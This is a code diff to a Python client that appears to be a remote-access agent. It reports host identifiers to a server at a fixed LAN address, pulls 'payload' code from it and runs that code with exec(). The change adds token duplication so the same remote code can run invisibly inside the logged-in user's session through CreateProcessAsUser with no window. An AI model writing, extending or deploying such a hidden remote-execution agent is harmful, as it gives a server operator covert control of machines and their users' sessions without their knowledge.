@@ -5,13 +5,23 @@ from uuid import getnode
 from time import sleep
 import requests
 import sys
+import win32api
+import win32con
+import win32process
+import win32security
+import win32ts
+import win32profile
 
 SERVER_URL = "http://192.168.10.77:8000"
 WS_URL = "ws://192.168.10.77:8000/ws"
 PAYLOAD_RESPONSE_API = "/payload_response"
 IP_V4_ADDRESS = gethostbyname(gethostname())
 MAC_ADDRESS = ':'.join(f'{(getnode() >> ele) & 0xff:02x}' for ele in range(40, -1, -8))
-PC_NAME = os.getenv('COMPUTERNAME')
+PC_NAME = "PC"
+try:
+    PC_NAME = os.getenv('COMPUTERNAME')
+except Exception as e:
+    print(f"Couldn't get pc name {e}")
 USER_ID_FILE = "UniqueUserID.txt"
 USER_ID = ""
 user_id_lock = threading.Lock()
@@ -25,13 +35,52 @@ headers = {
     "x-user-id": USER_ID,
 }
 header_lock = threading.Lock()
+PYTHON_EXE = sys.executable
+
+def launch_python_code_in_user_session(code: str):
+    try:
+        session_id = win32ts.WTSGetActiveConsoleSessionId()
+        if session_id == 0xFFFFFFFF:
+            return
+        user_token = win32ts.WTSQueryUserToken(session_id)
+        duplicated_token = win32security.DuplicateTokenEx(
+            user_token,
+            win32security.SecurityImpersonation,
+            win32con.TOKEN_ALL_ACCESS,
+            win32security.TokenPrimary,
+            None
+        )
+        user_env = win32profile.CreateEnvironmentBlock(duplicated_token, False)
+        # Escape quotes properly
+        safe_code = code.replace('"', '\\"')
+
+        cmd = f'"{PYTHON_EXE}" -c "{safe_code}"'
+
+        win32process.CreateProcessAsUser(
+            duplicated_token,
+            None,
+            cmd,
+            None,
+            None,
+            False,
+            win32con.CREATE_NO_WINDOW | win32con.CREATE_UNICODE_ENVIRONMENT,
+            user_env,
+            None,
+            win32process.STARTUPINFO()
+        )
+
+    except Exception as e:
+        print(f"error: {e}")
 
 def run_payload_code(code: str):
     exec(code, globals())
 
-def execute_payload(payload_code, payload_id):
+def execute_payload(payload_code, payload_id, launch_as_user):
     try:
-        run_payload_code(payload_code)
+        if launch_as_user:
+            launch_python_code_in_user_session(payload_code)
+        else:
+            run_payload_code(payload_code)
         payload_status, err = "success", ""
     except Exception as e:
         print(f"Payload {payload_id} error:", e)
@@ -61,9 +110,10 @@ def handle_response(resp):
         if payload:
             payload_id = hash(payload)
             print(f"Starting payload {payload_id}")
+            is_user_mode = data.get("is_user_mode")
             payload_thread = threading.Thread(
                 target=execute_payload,
-                args=(payload, payload_id),
+                args=(payload, payload_id, is_user_mode),
                 daemon=False
             )
             payload_thread.start()
